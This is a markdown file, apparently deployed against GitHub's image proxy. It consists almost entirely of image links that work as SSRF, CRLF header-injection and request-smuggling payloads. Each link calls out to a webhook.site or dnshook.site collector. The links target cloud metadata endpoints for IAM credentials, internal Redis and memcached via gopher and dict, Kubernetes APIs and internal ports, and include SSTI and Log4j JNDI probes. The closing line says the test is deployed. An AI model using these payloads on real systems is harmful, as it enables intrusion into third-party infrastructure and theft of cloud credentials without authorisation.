# SSRF Test v14 - Advanced Exploitation & Chaining

Version 14: Combining multiple injection techniques for deeper exploitation

## Test Category: SSRF Chain Attacks

### 1. Canary
![v14](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/v14-canary.gif)

### 2. Combined Host + Auth Header
![double1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20internal.github.com%0d%0aAuthorization:%20Bearer%20admin_token%0d%0a.gif)
![double2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20169.254.169.254%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a.gif)

### 3. Request Smuggling + Internal Host
![smug1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-AWS-EC2-Metadata:%20true%0d%0a.gif)
![smug2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/latest/meta-data/iam/security-credentials%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a.gif)

### 4. Triple Header Injection
![triple1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20127.0.0.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aX-Real-IP:%20127.0.0.1%0d%0a.gif)
![triple2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aAuthorization:%20Basic%20YWRtaW46YWRtaW4=%0d%0aX-Api-Key:%20secret%0d%0aCookie:%20session=admin%0d%0a.gif)

### 5. Cache Poisoning Chains
![cache1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aX-Forwarded-Host:%20evil.com%0d%0aX-Original-URL:%20/admin%0d%0aX-Rewrite-URL:%20/admin%0d%0a.gif)
![cache2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aX-Host:%20evil.com%0d%0aX-Forwarded-Server:%20evil.com%0d%0aX-HTTP-Host-Override:%20evil.com%0d%0a.gif)

### 6. SSRF to Internal Services
![int1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20localhost:6379%0d%0a%0d%0aSET%20pwned%20true%0d%0a.gif)
![int2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20localhost:11211%0d%0a%0d%0astats%0d%0a.gif)
![int3](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20localhost:27017%0d%0a.gif)

### 7. Protocol Smuggling via Path
![proto1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0a%0d%0aGET%20gopher://127.0.0.1:6379/_SET%20pwn%20true%20HTTP/1.1%0d%0aHost:%20x%0d%0a.gif)
![proto2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0a%0d%0aGET%20dict://127.0.0.1:11211/stats%20HTTP/1.1%0d%0aHost:%20x%0d%0a.gif)

### 8. AWS/Cloud Metadata Chains
![aws1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token:%20AWSTokenHere%0d%0a.gif)
![aws2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20169.254.170.2%0d%0aX-Container-Credentials:%20true%0d%0a.gif)
![gcp1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20metadata.google.internal%0d%0aMetadata-Flavor:%20Google%0d%0a.gif)
![azure1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20169.254.169.254%0d%0aMetadata:%20true%0d%0a.gif)

### 9. GraphQL Injection
![gql1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/graphql?query=%0d%0aHost:%20internal-api%0d%0aContent-Type:%20application/json%0d%0a%0d%0a{"query":"{__schema{types{name}}}"}.gif)

### 10. Kubernetes Metadata
![k8s1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20kubernetes.default.svc%0d%0aAuthorization:%20Bearer%20eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.test%0d%0a.gif)
![k8s2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%2010.0.0.1:10250%0d%0a.gif)

### 11. DNS Service Discovery
![dns1](https://camo-internal.b98ec445-cbcd-46e2-b0d7-3feaa1692332.dnshook.site/test.gif)
![dns2](https://github-internal.b98ec445-cbcd-46e2-b0d7-3feaa1692332.dnshook.site/test.gif)
![dns3](https://kubernetes-api.b98ec445-cbcd-46e2-b0d7-3feaa1692332.dnshook.site/test.gif)
![dns4](https://redis-master.b98ec445-cbcd-46e2-b0d7-3feaa1692332.dnshook.site/test.gif)
![dns5](https://elasticsearch.b98ec445-cbcd-46e2-b0d7-3feaa1692332.dnshook.site/test.gif)

### 12. SSRF via DNS Rebinding Setup
![rebind](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%207f000001.c0a80001.rbndr.us%0d%0a.gif)

### 13. Internal Port Scanning Headers
![port1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20127.0.0.1:22%0d%0a.gif)
![port2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20127.0.0.1:3306%0d%0a.gif)
![port3](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20127.0.0.1:5432%0d%0a.gif)
![port4](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aHost:%20127.0.0.1:9200%0d%0a.gif)

### 14. Server-Side Template Injection via Headers
![ssti1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aX-Custom-Header:%20{{7*7}}%0d%0a.gif)
![ssti2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aX-Template:%20${7*7}%0d%0a.gif)
![ssti3](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aX-Expr:%20<%25=%207*7%20%25>%0d%0a.gif)

### 15. Log4j/JNDI Style
![jndi1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aX-Api-Version:%20${jndi:ldap://b98ec445-cbcd-46e2-b0d7-3feaa1692332.dnshook.site/a}%0d%0a.gif)
![jndi2](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%0d%0aUser-Agent:%20${jndi:rmi://b98ec445-cbcd-46e2-b0d7-3feaa1692332.dnshook.site/a}%0d%0a.gif)

### 16. Request Pipeline Exploitation
![pipe1](https://webhook.site/b98ec445-cbcd-46e2-b0d7-3feaa1692332/x%20HTTP/1.1%0d%0aHost:%20webhook.site%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0aGET%20/final.gif)

Test deployed: v14 - Chained exploitation vectors